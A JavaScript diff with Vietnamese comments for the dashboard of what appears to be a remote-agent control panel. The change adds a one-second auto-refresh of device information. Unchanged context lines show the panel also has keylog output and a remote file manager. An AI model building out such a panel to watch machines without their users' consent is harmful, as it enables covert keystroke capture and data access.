@@ -29,6 +29,12 @@ document.addEventListener('DOMContentLoaded', () => {
     // 0. HÀM CLEANUP: Tắt tính năng cũ trước khi đổi Agent
     // =================================================================
     function resetActiveFeatures() {
+        // Stop device info auto-refresh
+        if (state.deviceInfoInterval) {
+            clearInterval(state.deviceInfoInterval);
+            state.deviceInfoInterval = null;
+        }
+
         if (isWsConnected() && state.currentAgentId) {
 
             if (state.currentView === 'files') {
@@ -365,7 +371,32 @@ document.addEventListener('DOMContentLoaded', () => {
         return true;
     }
 
+    // Device Info auto-refresh functions
+    function startDeviceInfoRefresh() {
+        stopDeviceInfoRefresh(); // Clear any existing interval
+        if (canUseAgentFeature()) {
+            sendWsMessage({ command: 'get_device_info', type: 'all' });
+            state.deviceInfoInterval = setInterval(() => {
+                if (canUseAgentFeature() && state.currentView === 'device-info') {
+                    sendWsMessage({ command: 'get_device_info', type: 'all' });
+                }
+            }, 1000); // Refresh every 1 second
+        }
+    }
+
+    function stopDeviceInfoRefresh() {
+        if (state.deviceInfoInterval) {
+            clearInterval(state.deviceInfoInterval);
+            state.deviceInfoInterval = null;
+        }
+    }
+
     function showView(viewId) {
+        // Stop device info refresh when leaving the view
+        if (state.currentView === 'device-info' && viewId !== 'device-info') {
+            stopDeviceInfoRefresh();
+        }
+
         state.currentView = viewId;
         $$('.content-view').forEach(v => v.classList.remove('active'));
         const targetView = $(`#view-${viewId}`);
@@ -376,7 +407,12 @@ document.addEventListener('DOMContentLoaded', () => {
         const activeItem = $(`.nav-item[data-view="${parent || viewId}"]`);
         if (activeItem) activeItem.classList.add('active');
 
-        if (isWsConnected()) loadDataForCurrentView();
+        // Start device info refresh when entering the view
+        if (viewId === 'device-info' && isWsConnected()) {
+            startDeviceInfoRefresh();
+        } else if (isWsConnected()) {
+            loadDataForCurrentView();
+        }
     }
 
     function showConfirmModal(title, msg, type, callback) {
@@ -802,6 +838,14 @@ document.addEventListener('DOMContentLoaded', () => {
         $('#keylog-output').textContent = 'Cleared.';
         state.isKeylogClean = true;
     };
+
+    // --- Device Info Events ---
+    if ($('#btn-refresh-device-info')) {
+        $('#btn-refresh-device-info').onclick = () => {
+            if (!canUseAgentFeature()) return;
+            startDeviceInfoRefresh(); // Restart auto-refresh
+        };
+    }
 
     // --- File Manager Events ---
     if ($('#btn-fs-go')) $('#btn-fs-go').onclick = () => {
